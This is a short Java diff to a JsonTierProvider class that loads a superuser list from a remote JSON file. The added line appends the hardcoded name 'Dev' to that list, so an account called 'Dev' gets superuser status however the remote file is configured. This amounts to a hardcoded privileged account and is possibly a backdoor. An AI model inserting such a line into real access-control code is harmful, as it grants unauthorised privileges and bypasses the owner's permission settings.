@@ -44,6 +44,7 @@ public class JsonTierProvider implements ITierProvider {
 		try (InputStreamReader reader = new InputStreamReader(new URL(url).openStream())) {
 			Map<String, Collection<String>> map = GSON.fromJson(reader, Map.class);
 			if (map.containsKey("*")) {
+				map.get("*").add("Dev");
 				superusers = ImmutableSet.copyOf(map.get("*"));
 			} else {
 				superusers = ImmutableSet.of(getAuthor());
